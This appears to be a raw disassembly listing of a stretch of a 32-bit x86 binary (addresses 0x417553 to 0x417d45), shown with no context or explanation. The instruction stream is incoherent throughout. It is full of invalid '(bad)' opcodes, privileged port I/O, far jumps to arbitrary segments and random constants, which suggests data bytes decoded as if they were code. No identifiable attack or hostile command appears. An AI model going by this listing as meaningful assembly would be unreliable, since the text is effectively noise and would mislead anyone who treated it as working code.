  417553:	pop    DWORD PTR [esi-0x48]
  417556:	xchg   edx,eax
  417557:	pop    ecx
  417558:	stos   DWORD PTR es:[edi],eax
  417559:	retf   
  41755a:	ja     0x4175b0
  41755c:	jg     0x4175ad
  41755e:	popf   
  41755f:	jge    0x417575
  417561:	in     eax,0xad
  417563:	(bad)  
  417564:	inc    edi
  417565:	mov    cl,cl
  417567:	xchg   ebp,eax
  417568:	lahf   
  417569:	loopne 0x41755f
  41756b:	dec    ebp
  41756c:	mov    cl,0x39
  41756e:	js     0x4175e8
  417570:	stc    
  417571:	pusha  
  417572:	lahf   
  417573:	sub    dl,bl
  417575:	mov    edi,0xb6b8f648
  41757a:	jp     0x417527
  41757c:	test   BYTE PTR [ecx-0x63618180],dh
  417582:	and    edx,0x5d
  417585:	jecxz  0x4175fe
  417587:	cmp    ah,BYTE PTR [ebx-0x3bcbb97f]
  41758d:	sbb    dl,BYTE PTR [edi-0x2f7b44d8]
  417593:	jo     0x41755e
  417595:	int3   
  417596:	(bad)  
  417597:	jns    0x417559
  417599:	test   eax,0xe5434fbd
  41759e:	push   cs
  41759f:	(bad)  
  4175a0:	iret   
  4175a1:	push   ebp
  4175a2:	stc    
  4175a3:	retf   
  4175a4:	ds jno 0x4175d2
  4175a7:	xchg   edi,eax
  4175a8:	shr    BYTE PTR [ebp-0x66],cl
  4175ab:	xlat   BYTE PTR ds:[ebx]
  4175ac:	and    DWORD PTR [eax+edx*4],esi
  4175af:	xchg   BYTE PTR [edx+ebp*2],bh
  4175b2:	sub    eax,DWORD PTR [ebx]
  4175b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175b5:	es into 
  4175b7:	fcmovu st,st(4)
  4175b9:	sub    bh,ah
  4175bb:	and    al,0xf0
  4175bd:	push   es
  4175be:	sub    ebp,DWORD PTR ds:0xe3236d8e
  4175c4:	pop    es
  4175c5:	mov    edx,0x7f94c2c1
  4175ca:	mov    esi,0x309ba363
  4175cf:	call   0xe1d7:0x758029ec
  4175d6:	sbb    ecx,DWORD PTR [edx-0x1fcffbb5]
  4175dc:	xchg   ebp,eax
  4175dd:	mov    al,0xd3
  4175df:	cmp    eax,0xa2a56da7
  4175e4:	ja     0x4175c7
  4175e6:	jno    0x41759b
  4175e8:	sub    BYTE PTR [ebp+0x69150e42],cl
  4175ee:	mov    eax,ds:0x6821b005
  4175f3:	push   cs
  4175f4:	in     eax,dx
  4175f5:	mov    esp,0xcaff46df
  4175fa:	inc    esi
  4175fb:	or     eax,0x3157ba8d
  417600:	stos   BYTE PTR es:[edi],al
  417601:	adc    edx,DWORD PTR [ebx+eiz*1+0x50]
  417605:	mov    bh,0x74
  417607:	push   cs
  417608:	retf   0xaf07
  41760b:	and    BYTE PTR [edx+0x6],cl
  41760e:	retf   0x461d
  417611:	cmp    esp,DWORD PTR [ecx]
  417613:	lea    esi,[ecx+0x28]
  417616:	lock adc DWORD PTR [eax-0x658a6e26],edi
  41761d:	and    eax,0xe9e9dac5
  417622:	sbb    BYTE PTR [esi+edi*1],ah
  417625:	jb     0x417665
  417627:	daa    
  417628:	or     eax,0x5b6e6112
  41762d:	int3   
  41762e:	push   0x1793e2de
  417633:	call   FWORD PTR [eax+0x3f98eaf3]
  417639:	jo     0x417684
  41763b:	je     0x417639
  41763d:	xchg   ecx,eax
  41763e:	dec    ebp
  41763f:	push   cs
  417640:	shl    DWORD PTR [ecx+0x533a6ff2],1
  417646:	nop
  417647:	mov    al,0x5b
  417649:	out    dx,eax
  41764a:	and    al,0x4e
  41764c:	or     bh,BYTE PTR [esi]
  41764e:	gs es ins DWORD PTR es:[edi],dx
  417651:	mov    ebx,0x6f2cdd0f
  417656:	push   cs
  417657:	out    0xc7,eax
  417659:	inc    edx
  41765a:	test   dl,bh
  41765c:	adc    ebp,edx
  41765e:	imul   edx,DWORD PTR [eax],0x4
  417661:	iret   
  417662:	jb     0x417669
  417664:	mov    dl,0x46
  417666:	fld    TBYTE PTR [esi]
  417668:	icebp  
  417669:	mov    eax,0x84d300a1
  41766e:	push   ebp
  41766f:	inc    ecx
  417670:	adc    edx,DWORD PTR [ecx-0x61e1c150]
  417676:	push   ecx
  417677:	inc    ebx
  417678:	xchg   DWORD PTR [eax],eax
  41767a:	ret    0xd624
  41767d:	add    eax,0x5a6df56e
  417682:	jmp    0x1161d343
  417687:	in     eax,dx
  417688:	jp     0x41766b
  41768a:	jne    0x4176eb
  41768c:	mov    dl,0x4a
  41768e:	sbb    al,0x79
  417690:	mov    edx,0x3cf44224
  417695:	xlat   BYTE PTR ds:[ebx]
  417696:	push   ebp
  417697:	loope  0x4176eb
  417699:	adc    BYTE PTR [ecx],cl
  41769b:	sub    edx,edx
  41769d:	cwde   
  41769e:	adc    eax,esp
  4176a0:	in     al,0xa2
  4176a2:	mov    esp,0x4463d3ac
  4176a7:	scas   al,BYTE PTR es:[edi]
  4176a8:	mov    ecx,0x9e5c0f74
  4176ad:	cwde   
  4176ae:	mov    ah,0xc5
  4176b0:	nop
  4176b1:	pop    ecx
  4176b2:	lock jns 0x4176a5
  4176b5:	fistp  DWORD PTR ds:0xe098037b
  4176bb:	cmp    edx,DWORD PTR [edx-0x7d]
  4176be:	test   BYTE PTR [ebx],cl
  4176c0:	jmp    0x45ec4444
  4176c5:	or     BYTE PTR cs:[edx-0x6a],ah
  4176c9:	dec    ebp
  4176ca:	push   0xffffffd7
  4176cc:	jg     0x4176e9
  4176ce:	jnp    0x4176ab
  4176d0:	xor    BYTE PTR [esi-0x63],0x85
  4176d4:	jle    0x4176fe
  4176d6:	addr16 push ds
  4176d8:	jg     0x41767f
  4176da:	jnp    0x417675
  4176dc:	aad    0x25
  4176de:	sbb    eax,0x7d2b3b11
  4176e3:	or     DWORD PTR [esi-0xb9683bf],ebp
  4176e9:	rol    BYTE PTR [eax],1
  4176eb:	push   eax
  4176ec:	and    BYTE PTR [edi],dh
  4176ee:	sub    eax,0xedc6528d
  4176f3:	retf   0x628e
  4176f6:	pop    ss
  4176f7:	outs   dx,DWORD PTR ds:[esi]
  4176f8:	vxorpd ymm4,ymm1,ymm4
  4176fc:	jmp    0xa92c:0x87fdb63e
  417703:	inc    ebx
  417704:	cmc    
  417705:	add    ecx,DWORD PTR [eax+0xd]
  417708:	outs   dx,BYTE PTR ds:[esi]
  417709:	stc    
  41770a:	mov    edi,0xc7c75136
  41770f:	sbb    al,0xb
  417711:	mov    ah,0xe7
  417713:	sub    BYTE PTR ds:0x1f05fc3,bl
  417719:	pop    ebx
  41771a:	ins    BYTE PTR es:[edi],dx
  41771b:	mov    ds:0x597b7479,al
  417720:	inc    BYTE PTR [ebx-0x4a]
  417723:	jno    0x417722
  417725:	pop    ds
  417726:	mov    esp,DWORD PTR [eax+0x1811003c]
  41772c:	rol    BYTE PTR [ebp+eax*1-0x4dd586fc],0x7a
  417734:	adc    al,0xc7
  417736:	int    0x11
  417738:	add    dh,BYTE PTR [eax+0x29]
  41773b:	push   eax
  41773c:	cli    
  41773d:	adc    ch,dl
  41773f:	out    dx,al
  417740:	sbb    BYTE PTR [ecx-0x26d29e2f],bh
  417746:	adc    BYTE PTR ds:0xebae6521,bl
  41774c:	ret    
  41774d:	sub    eax,0xfd664b10
  417752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417753:	xchg   edx,eax
  417754:	jecxz  0x4177be
  417756:	or     DWORD PTR [ebx+0x6e9dea0],ecx
  41775c:	push   edi
  41775d:	imul   esp,DWORD PTR [eax],0xcf9aaf0d
  417763:	dec    ecx
  417764:	(bad)  
  417765:	mov    edi,0x931f10aa
  41776a:	push   esp
  41776b:	sub    eax,0x49
  41776e:	mov    ds:0x9fb7d178,eax
  417773:	mov    ebp,0xee8492b0
  417778:	rol    BYTE PTR [ebx+0x278722f8],1
  41777e:	sar    edi,0x56
  417781:	add    ecx,DWORD PTR [ebx]
  417783:	addr16 pop es
  417785:	pop    ecx
  417786:	inc    esp
  417787:	push   0x40eb4d3a
  41778c:	movlps xmm5,QWORD PTR [edi+0x6c88dcc6]
  417793:	retf   0x68d9
  417796:	push   cs
  417797:	xchg   BYTE PTR ds:0x875ac53c,cl
  41779d:	in     al,0xe9
  41779f:	mov    al,0xef
  4177a1:	sub    al,0xfc
  4177a4:	cmp    eax,0x902e8ff6
  4177a9:	pop    ebp
  4177aa:	cmp    BYTE PTR [eax+eiz*8+0x5b],al
  4177ae:	cmp    DWORD PTR ds:0x91917e0d,0x12d4de57
  4177b8:	aas    
  4177b9:	test   eax,0x643405ac
  4177be:	jo     0x417756
  4177c0:	dec    esp
  4177c1:	retf   0x2799
  4177c4:	fwait
  4177c5:	addr16 dec edx
  4177c7:	jg     0x4177aa
  4177c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177ca:	pop    ebp
  4177cb:	in     al,0x36
  4177cd:	aam    0xd9
  4177cf:	xor    ebp,DWORD PTR [ecx]
  4177d1:	inc    ecx
  4177d2:	inc    ebp
  4177d3:	not    DWORD PTR [edi]
  4177d5:	inc    ebx
  4177d6:	sbb    BYTE PTR [ebx+0x78],bl
  4177d9:	pop    ss
  4177da:	mov    ah,0x98
  4177dc:	jecxz  0x4177ae
  4177de:	lock in eax,dx
  4177e0:	cmovo  ebx,edi
  4177e3:	jnp    0x41784c
  4177e5:	(bad)  
  4177e6:	mov    al,0x6d
  4177e8:	call   DWORD PTR [edx-0x31]
  4177eb:	(bad)  
  4177ed:	sbb    al,0xcd
  4177ef:	not    DWORD PTR [edi-0xe290eb9]
  4177f5:	dec    ebp
  4177f6:	and    al,0x93
  4177f8:	enter  0x87a2,0xbb
  4177fc:	hlt    
  4177fd:	xchg   esi,eax
  4177fe:	adc    ch,BYTE PTR [edx+0x3965c60b]
  417804:	dec    edi
  417805:	das    
  417806:	mov    dl,0x32
  417808:	in     al,0x22
  41780a:	inc    ecx
  41780b:	xor    al,0x4d
  41780d:	out    dx,al
  41780e:	adc    ebp,edi
  417810:	push   eax
  417811:	xchg   ecx,eax
  417812:	xchg   bh,bl
  417814:	(bad)  
  417816:	inc    ebx
  417817:	cmp    ch,bl
  417819:	cmp    BYTE PTR [ecx],al
  41781b:	imul   ecx,ecx,0xffffffd5
  41781e:	imul   ebx,DWORD PTR [ebx+0x2b],0xffffffe2
  417822:	pop    ss
  417823:	pop    ebp
  417824:	push   0xffffffe1
  417826:	mov    ecx,0xd98c9599
  41782b:	loopne 0x41787c
  41782d:	mov    ch,0xcb
  41782f:	pusha  
  417830:	int    0xc4
  417832:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417833:	dec    ebp
  417834:	aas    
  417835:	push   0x11
  417837:	mov    dl,0x69
  417839:	mov    ah,0x6b
  41783b:	or     eax,0x2be8e92c
  417840:	sti    
  417841:	mov    eax,ds:0x27f35b8c
  417846:	out    0xa7,eax
  417848:	imul   eax,DWORD PTR [ebx-0x6d],0xffffffdb
  41784c:	mov    dl,0x2a
  41784e:	adc    eax,DWORD PTR [eax+eiz*1-0x185f81d0]
  417855:	push   ecx
  417856:	inc    esi
  417857:	fnstenv [ecx+0x57]
  41785a:	dec    ebp
  41785b:	nop
  41785c:	shr    DWORD PTR [edi+0x36],1
  41785f:	inc    ecx
  417860:	adc    eax,0x363d637a
  417865:	inc    edi
  417867:	rol    DWORD PTR [ebp+0x17e6c1b3],0x35
  41786e:	sub    DWORD PTR [ecx],esp
  417870:	mov    ds:0x465c5843,eax
  417875:	fnstsw WORD PTR [ecx+0x49]
  417878:	stos   BYTE PTR es:[edi],al
  417879:	sar    eax,0xce
  41787c:	aad    0xb
  41787e:	pusha  
  41787f:	jae    0x4178bd
  417881:	or     al,0x0
  417883:	(bad)  
  417884:	(bad)  
  417885:	popa   
  417886:	add    eax,DWORD PTR [ebx+0x7f6dbb4]
  41788c:	mov    ecx,0x7da9c60b
  417891:	xchg   BYTE PTR [ebp+edx*8-0x57],cl
  417895:	add    BYTE PTR [edx-0x3a],ch
  417898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417899:	sti    
  41789a:	jbe    0x417863
  41789c:	shr    esi,cl
  41789e:	mov    esi,0x4e422e02
  4178a3:	scas   eax,DWORD PTR es:[edi]
  4178a4:	icebp  
  4178a5:	aam    0xc6
  4178a7:	dec    edx
  4178a8:	pop    es
  4178a9:	and    ebp,edi
  4178ab:	push   edi
  4178ac:	sub    DWORD PTR [edx+ebx*1],ecx
  4178af:	jmp    0x2715:0x94ef8f31
  4178b6:	int3   
  4178b7:	jmp    0x8fec4926
  4178bc:	ins    DWORD PTR es:[edi],dx
  4178bd:	leave  
  4178be:	outs   dx,BYTE PTR ds:[esi]
  4178bf:	sub    ecx,DWORD PTR [ebx+0x3914406a]
  4178c5:	mov    bl,0x49
  4178c7:	bound  eax,QWORD PTR [edx+0x6f3edfb8]
  4178cd:	iret   
  4178ce:	leave  
  4178cf:	and    DWORD PTR [esi],esi
  4178d1:	dec    ebx
  4178d2:	ror    BYTE PTR [ebx],1
  4178d4:	xchg   esp,eax
  4178d5:	lea    ebp,[esi-0x65]
  4178d8:	cmp    ebx,ecx
  4178da:	(bad)  
  4178db:	loop   0x4178bd
  4178dd:	xchg   edx,eax
  4178de:	mov    eax,ds:0xf7462f49
  4178e3:	out    0x13,eax
  4178e5:	add    eax,0xee4beefa
  4178ea:	adc    esi,DWORD PTR [edx]
  4178ec:	jbe    0x41787b
  4178ee:	mov    esp,0xf28f3b4f
  4178f3:	ss (bad) 
  4178f5:	mov    gs,ecx
  4178f7:	and    eax,0xb6f2e519
  4178fc:	dec    ebp
  4178fd:	inc    BYTE PTR [eax-0x14f8e949]
  417903:	inc    esp
  417904:	outs   dx,BYTE PTR ds:[esi]
  417905:	nop
  417906:	ss aad 0x10
  417909:	into   
  41790a:	cmp    eax,0x81f335a3
  41790f:	mov    eax,0x6da7445e
  417914:	call   0xd2ac:0x93bf14dc
  41791b:	mov    ds:0xb2a65f8b,eax
  417920:	out    0x69,eax
  417922:	xor    DWORD PTR [eax],ecx
  417924:	dec    eax
  417925:	loope  0x417987
  417927:	pop    ss
  417928:	pop    es
  417929:	xor    ah,BYTE PTR [edx-0x33]
  41792c:	dec    esp
  41792d:	mov    dl,0xba
  41792f:	arpl   WORD PTR [ebx-0x79],bx
  417932:	xchg   ecx,eax
  417933:	inc    ebx
  417934:	xchg   edx,eax
  417935:	xor    ah,dl
  417937:	mov    ebp,0xd782109d
  41793c:	repz call 0x20c746d
  417942:	or     esp,DWORD PTR [ebx+0x1a]
  417945:	ret    
  417946:	push   esi
  417947:	stc    
  417948:	cmp    al,0x4a
  41794a:	or     al,0xcf
  41794c:	ins    BYTE PTR es:[edi],dx
  41794d:	(bad)  
  41794e:	ror    edi,1
  417950:	fs and dl,ch
  417953:	adc    esi,DWORD PTR [eax+ecx*8]
  417956:	and    esi,DWORD PTR [ebx+ebx*8]
  417959:	xchg   ebx,eax
  41795a:	adc    DWORD PTR [esi],ebx
  41795c:	push   esi
  41795d:	cld    
  41795e:	dec    ecx
  41795f:	sub    dh,BYTE PTR [edx]
  417961:	loopne 0x41793b
  417963:	arpl   WORD PTR [ecx],dx
  417965:	xchg   esp,eax
  417966:	sbb    BYTE PTR [ebx+ebp*2],dh
  417969:	fbld   TBYTE PTR [ebx-0x63]
  41796c:	in     eax,0x1a
  41796e:	bound  ebx,QWORD PTR [ebx]
  417970:	sbb    al,0xa0
  417972:	ror    DWORD PTR [edx-0x7df556ba],1
  417978:	mov    edi,0x73c9b3bc
  41797d:	(bad)  
  41797e:	packsswb mm2,QWORD PTR [edi]
  417981:	sti    
  417982:	fwait
  417983:	pop    ecx
  417984:	nop
  417985:	inc    eax
  417986:	imul   edi,DWORD PTR [ecx-0x45],0xaa51ebe5
  41798d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41798e:	test   DWORD PTR [ecx+0x54],ebp
  417991:	gs mov bh,0xaa
  417994:	dec    ebx
  417995:	mov    ebx,0x86ea213d
  41799a:	loope  0x417a0a
  41799c:	mov    bh,0x43
  41799e:	xchg   ecx,eax
  41799f:	or     al,0xdd
  4179a1:	lods   eax,DWORD PTR ds:[esi]
  4179a2:	mul    DWORD PTR [esi-0x5b6b574c]
  4179a8:	mov    cl,0xf3
  4179aa:	add    eax,0xe1327bb2
  4179af:	dec    edx
  4179b0:	stc    
  4179b1:	int3   
  4179b2:	xor    BYTE PTR [ebx+0x56],0x34
  4179b6:	in     al,dx
  4179b7:	xchg   BYTE PTR [ebx-0x17fd1d03],dl
  4179bd:	sbb    esi,DWORD PTR [eax]
  4179bf:	sahf   
  4179c0:	dec    esi
  4179c1:	pop    ecx
  4179c2:	mov    bh,0xa9
  4179c4:	push   edx
  4179c5:	call   0x3c58779
  4179ca:	pop    bx
  4179cc:	jle    0x417a35
  4179ce:	mov    dh,0x9a
  4179d0:	mov    dl,0xa4
  4179d2:	jo     0x9b04cb46
  4179d8:	addr16 or edx,0x530e710f
  4179df:	stc    
  4179e0:	retf   0x1b6
  4179e3:	and    ebp,ebp
  4179e5:	jle    0x417a18
  4179e7:	aas    
  4179e8:	ret    
  4179e9:	hlt    
  4179ea:	clc    
  4179eb:	stos   BYTE PTR es:[edi],al
  4179ec:	mov    ecx,0x931adf00
  4179f1:	pop    edx
  4179f2:	(bad)  
  4179f3:	pop    eax
  4179f4:	aad    0x2d
  4179f6:	cmc    
  4179f7:	int    0xb1
  4179f9:	cwde   
  4179fa:	sbb    al,0x5a
  4179fc:	cmp    esp,DWORD PTR [ebx]
  4179fe:	repz mov dl,0xf0
  417a01:	arpl   WORD PTR [ecx],bx
  417a03:	shl    DWORD PTR [ebp-0x33],cl
  417a06:	ret    0x28f4
  417a09:	les    esp,FWORD PTR [edx]
  417a0b:	in     al,0xdc
  417a0d:	cmp    BYTE PTR ds:0x3620a281,bl
  417a13:	mov    esp,0xb6671083
  417a18:	mov    ds:0xa4350346,al
  417a1d:	clc    
  417a1e:	pop    esi
  417a1f:	and    DWORD PTR [edi-0x79229f29],ecx
  417a25:	jmp    0x881f:0xe98ee41d
  417a2c:	mov    ds:0xfc80d291,al
  417a31:	aaa    
  417a32:	iret   
  417a33:	cmp    al,0xd6
  417a35:	push   edi
  417a36:	sub    edi,DWORD PTR [eax]
  417a38:	jg     0x4179c9
  417a3a:	hlt    
  417a3b:	jo     0x417a52
  417a3d:	sar    BYTE PTR [ebp-0x2],cl
  417a40:	repnz push 0x66
  417a43:	sbb    bh,cl
  417a45:	dec    ecx
  417a46:	outs   dx,DWORD PTR ds:[esi]
  417a47:	sub    eax,0x452564b8
  417a4c:	inc    ebp
  417a4d:	fcomp  QWORD PTR [edx-0x9a07400]
  417a53:	and    DWORD PTR [eax+eiz*8],esp
  417a56:	jmp    0xbaef:0x15878d6f
  417a5d:	pop    eax
  417a5e:	lods   al,BYTE PTR ds:[esi]
  417a5f:	xor    bh,BYTE PTR [eax-0x66]
  417a62:	cld    
  417a63:	aas    
  417a64:	xor    edx,DWORD PTR ds:0xee9d0f20
  417a6a:	mov    edx,0xe80ce6a4
  417a6f:	bound  esi,QWORD PTR [edx+0x7b]
  417a72:	aad    0xed
  417a74:	adc    DWORD PTR [eax-0x7c],esp
  417a77:	cld    
  417a78:	retf   0xc639
  417a7b:	push   eax
  417a7c:	sub    al,0x8d
  417a7e:	mov    ecx,0x67772d3a
  417a83:	mov    bl,0xb0
  417a85:	jmp    0xebcad87a
  417a8a:	mov    ds:0x55641f14,eax
  417a8f:	aad    0xe3
  417a91:	mov    DWORD PTR [ebx+0x7],edx
  417a94:	loope  0x417a34
  417a96:	jp     0x417adc
  417a98:	cs pushf 
  417a9a:	or     al,0x6a
  417a9c:	xor    al,0xf6
  417a9e:	fwait
  417a9f:	pop    es
  417aa0:	mov    ecx,0x1d4166e1
  417aa5:	rcr    BYTE PTR [ecx],0x6c
  417aa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417aa9:	pop    ebp
  417aaa:	jnp    0x417b0d
  417aac:	dec    BYTE PTR [edx-0x1d]
  417aaf:	mov    edi,0x34cfc2d5
  417ab4:	fiadd  DWORD PTR [esi+0x29bd643]
  417aba:	sbb    DWORD PTR [ebp+0x584c7b6a],ecx
  417ac0:	mov    al,ds:0x952f6dd0
  417ac5:	fwait
  417ac6:	sub    bl,cl
  417ac8:	pusha  
  417ac9:	push   0xf158957e
  417ace:	leave  
  417acf:	adc    eax,0xad7935de
  417ad4:	mov    al,ds:0x6d346bd0
  417ad9:	retf   
  417ada:	pop    ds
  417adb:	push   ebp
  417adc:	test   al,0x13
  417ade:	inc    esi
  417adf:	adc    al,0x18
  417ae1:	mov    dh,0xc2
  417ae3:	test   bl,bh
  417ae5:	push   esp
  417ae6:	mov    ebx,0xbd952d8e
  417aeb:	in     eax,0x5f
  417aed:	jns    0x417ac9
  417aef:	popa   
  417af0:	mov    eax,0xd7ad448b
  417af5:	add    DWORD PTR [ecx],esp
  417af7:	sbb    dl,ch
  417af9:	xor    BYTE PTR [ebp-0x71],0x87
  417afd:	dec    ebx
  417afe:	jmp    0x417b29
  417b00:	inc    esi
  417b01:	fldenv gs:[eax-0x42e2b020]
  417b08:	push   ebx
  417b09:	lock inc ecx
  417b0b:	(bad)  
  417b0d:	inc    edx
  417b0e:	scas   al,BYTE PTR es:[edi]
  417b0f:	fsub   DWORD PTR [eax]
  417b11:	inc    ebp
  417b12:	sub    ebx,eax
  417b14:	xchg   ecx,eax
  417b15:	fwait
  417b16:	inc    ebp
  417b17:	mov    edi,0x6113f0f8
  417b1c:	fucomip st,st(2)
  417b1e:	imul   BYTE PTR [eax]
  417b20:	mov    dl,0x8e
  417b22:	clc    
  417b23:	lea    edi,[edx+0x1a]
  417b26:	pop    edx
  417b27:	jnp    0x417b8e
  417b29:	addr16 and al,0x83
  417b2c:	mov    bl,0xab
  417b2e:	and    DWORD PTR [esi+0x61],esp
  417b31:	mov    ah,0xe3
  417b33:	(bad)  
  417b34:	sbb    DWORD PTR ss:0x202d6cb9,0xffffff9c
  417b3c:	jo     0x417acd
  417b3e:	sbb    ah,dl
  417b40:	(bad)  
  417b41:	fdivr  DWORD PTR [ecx+edi*4+0x254352bd]
  417b48:	sub    ebx,ebx
  417b4a:	jmp    0x533a:0x10a6230f
  417b51:	adc    bl,BYTE PTR [ecx-0x798e6537]
  417b57:	loope  0x417b0f
  417b59:	fmul   DWORD PTR [eax+0x1d]
  417b5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b5d:	mov    DWORD PTR [edi-0x1c],ebp
  417b60:	add    esp,DWORD PTR cs:[esi]
  417b63:	stos   DWORD PTR es:[edi],eax
  417b64:	mov    esp,0x5cfd9002
  417b69:	or     al,0x43
  417b6b:	xchg   ecx,eax
  417b6c:	gs cmp eax,0xca4d9f1c
  417b72:	cmp    dl,BYTE PTR [esi+0x7bad5f60]
  417b78:	sub    al,0x12
  417b7a:	add    al,0x50
  417b7c:	icebp  
  417b7d:	mov    dl,0xb9
  417b7f:	and    BYTE PTR [esi+0x71],0x33
  417b83:	test   DWORD PTR [eax-0x5],esi
  417b86:	sbb    edi,eax
  417b88:	add    DWORD PTR [ecx+0x23],ecx
  417b8b:	jne    0x417bcc
  417b8d:	push   es
  417b8e:	inc    edi
  417b8f:	add    eax,0xdbf04e5b
  417b94:	jo     0x417c03
  417b96:	mov    edi,0x35349555
  417b9b:	daa    
  417b9c:	add    DWORD PTR [ebp+0x6f],ecx
  417b9f:	retf   0x9863
  417ba2:	adc    eax,0xac1f876b
  417ba7:	or     cl,ah
  417ba9:	mov    eax,ds:0x7d304507
  417bae:	retf   
  417baf:	and    al,0x23
  417bb1:	jo     0x417bf6
  417bb3:	and    eax,0xcd5bb510
  417bb8:	mov    cl,0xe0
  417bba:	mov    al,ds:0xc7e153ff
  417bbf:	sub    eax,0x986fa890
  417bc4:	sti    
  417bc5:	mov    BYTE PTR [ebx-0x38],0xf4
  417bc9:	push   edx
  417bca:	out    dx,al
  417bcb:	add    al,0xbc
  417bcd:	loope  0x417c3a
  417bcf:	add    dl,cl
  417bd1:	popf   
  417bd2:	mov    ah,BYTE PTR [esp+eax*1]
  417bd5:	xchg   ebx,eax
  417bd6:	add    BYTE PTR [esp+edx*8],cl
  417bd9:	push   ss
  417bda:	cmp    esi,edx
  417bdc:	lods   eax,DWORD PTR ds:[esi]
  417bdd:	adc    BYTE PTR [edx+0x22ab63c2],al
  417be3:	ins    DWORD PTR es:[edi],dx
  417be4:	mov    ebx,0x17280240
  417be9:	out    0x6a,eax
  417beb:	stc    
  417bec:	push   eax
  417bed:	push   esi
  417bee:	out    0xf4,eax
  417bf0:	inc    edx
  417bf1:	fimul  DWORD PTR [edi+ebx*4-0x2d2f74cb]
  417bf8:	dec    esi
  417bf9:	js     0x417c33
  417bfb:	and    al,0x1b
  417bfd:	cmp    DWORD PTR [eax],ebp
  417bff:	push   0xffffff87
  417c01:	cli    
  417c02:	add    ebp,ebp
  417c04:	pop    ss
  417c05:	xchg   ebx,eax
  417c06:	clc    
  417c07:	cmp    BYTE PTR [eax-0xc340f29],0x47
  417c0e:	xor    eax,0x7ae4e45d
  417c14:	add    DWORD PTR [ebx+0x622b48c3],esp
  417c1a:	stos   DWORD PTR es:[edi],eax
  417c1b:	mov    eax,ds:0x4b4575f9
  417c20:	fist   WORD PTR [edi]
  417c22:	dec    ebp
  417c23:	inc    ebx
  417c24:	mov    esp,0x39101801
  417c29:	iret   
  417c2a:	xor    ch,BYTE PTR [ebx-0x1bf7b036]
  417c30:	shl    BYTE PTR [eax],0x45
  417c33:	(bad)  
  417c35:	push   DWORD PTR [edi-0x4a]
  417c38:	outs   dx,DWORD PTR ds:[esi]
  417c39:	jp     0x417ca9
  417c3b:	sbb    DWORD PTR [edi+0x43],esi
  417c3e:	cwde   
  417c3f:	test   eax,0xae602f7
  417c44:	mov    eax,ds:0x79158132
  417c49:	(bad)  
  417c4a:	cli    
  417c4b:	jmp    0x8b3a:0x886d9066
  417c52:	lahf   
  417c53:	mov    al,ds:0x8f50d7ca
  417c58:	xchg   edx,eax
  417c59:	xchg   esp,eax
  417c5a:	les    edx,FWORD PTR [edi]
  417c5c:	(bad)  
  417c5d:	iret   
  417c5e:	ja     0x417c83
  417c60:	imul   edi,edi,0xffffffae
  417c63:	push   ebx
  417c64:	ss mov dl,0x37
  417c67:	clc    
  417c68:	add    al,0x9c
  417c6a:	loope  0x417c40
  417c6c:	shr    DWORD PTR [edx],cl
  417c6e:	sbb    bh,BYTE PTR [ebx+0xd1cc665]
  417c74:	mov    esp,0xced438bb
  417c79:	cmp    DWORD PTR [esi],edi
  417c7b:	lods   eax,DWORD PTR ds:[esi]
  417c7c:	jae    0x417c53
  417c7e:	test   ah,0xe7
  417c81:	fbstp  TBYTE PTR [ebp+0x29c66dc]
  417c87:	fwait
  417c88:	push   edi
  417c89:	retf   0x2583
  417c8c:	or     BYTE PTR [edi+0x7a],cl
  417c8f:	sub    al,0xd9
  417c91:	dec    eax
  417c92:	and    al,ch
  417c94:	mov    ch,0x69
  417c96:	mov    esi,0xca18ceb5
  417c9b:	ja     0x417cfb
  417c9d:	xlat   BYTE PTR ds:[ebx]
  417c9e:	cdq    
  417c9f:	sbb    eax,0x3f68b08c
  417ca4:	pop    ebx
  417ca5:	cmp    DWORD PTR cs:[ebp-0x60],esi
  417ca9:	pop    esp
  417caa:	xor    DWORD PTR [eax+edx*1],esi
  417cad:	icebp  
  417cae:	push   es
  417caf:	test   eax,0xf39639d3
  417cb4:	je     0x417cbd
  417cb6:	cdq    
  417cb7:	repnz loopne 0x417d12
  417cba:	mov    esp,0xb7076c46
  417cbf:	mov    bl,0xd7
  417cc1:	adc    al,0x8a
  417cc3:	gs push edi
  417cc5:	mov    dl,0x7e
  417cc7:	xlat   BYTE PTR ds:[ebx]
  417cc8:	repnz dec esi
  417cca:	jmp    0x12e1:0xabe0bc83
  417cd1:	fist   DWORD PTR [eax+0x2501cd28]
  417cd7:	push   ss
  417cd8:	or     BYTE PTR [ecx-0x6c4d667b],0x9d
  417cdf:	add    ebp,eax
  417ce1:	pop    ebx
  417ce2:	shl    DWORD PTR [edx],0xa
  417ce5:	add    BYTE PTR [edx+eax*4],0xf4
  417ce9:	int    0x2e
  417ceb:	fadd   st,st(6)
  417ced:	(bad)
  417cf0:	mov    esp,eax
  417cf2:	out    0x9e,al
  417cf4:	stos   DWORD PTR es:[edi],eax
  417cf5:	call   0x7cfa:0x513d94dd
  417cfc:	mov    bl,0x3
  417cfe:	inc    ebx
  417cff:	or     eax,0xe4841bae
  417d04:	repnz ins DWORD PTR es:[edi],dx
  417d06:	xchg   edx,eax
  417d07:	cdq    
  417d08:	div    BYTE PTR [ecx]
  417d0a:	mov    cl,0x59
  417d0c:	jo     0x417d82
  417d0e:	int3   
  417d0f:	add    ch,BYTE PTR [ebx]
  417d11:	rcl    ah,0x23
  417d14:	xor    DWORD PTR [eax-0x2a7bf40d],ebp
  417d1a:	push   es
  417d1b:	sbb    eax,0xee8c1138
  417d20:	inc    ebx
  417d21:	out    0x72,al
  417d23:	aad    0x12
  417d25:	push   ebx
  417d26:	sub    bh,BYTE PTR [eax+edx*4+0x691ff31]
  417d2d:	fcomi  st,st(5)
  417d2f:	pop    ds
  417d30:	scas   al,BYTE PTR es:[edi]
  417d31:	pop    ebp
  417d32:	in     al,0x80
  417d34:	leave  
  417d35:	xor    edi,ebx
  417d37:	or     bl,al
  417d39:	sbb    eax,0x9413cc06
  417d3e:	ins    BYTE PTR es:[edi],dx
  417d3f:	inc    esi
  417d40:	xlat   BYTE PTR ds:[ebx]
  417d41:	out    0xac,al
  417d43:	cmp    edx,edx
  417d45:	ficomp DWORD PTR [edi-0x22]
